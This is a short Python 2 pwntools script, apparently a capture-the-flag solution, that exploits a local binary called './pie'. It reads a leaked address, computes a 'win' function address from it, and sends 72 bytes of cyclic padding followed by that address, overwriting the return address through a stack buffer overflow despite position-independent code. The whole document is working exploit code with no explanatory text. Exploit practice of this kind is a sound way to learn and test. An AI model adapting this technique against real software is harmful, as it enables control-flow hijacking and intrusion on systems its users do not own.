#!/usr/bin/python2

from pwn import *

p = process("./pie")

leak = int(p.recvline(),16)
log.info("rip leak: " + hex(leak))

win_offset_from_leak = 3
win_addr = p64(leak+win_offset_from_leak)

offset = 72

payload = ""
payload += cyclic(offset)
payload += win_addr

p.sendline(payload)
print p.recvline()

p.close()


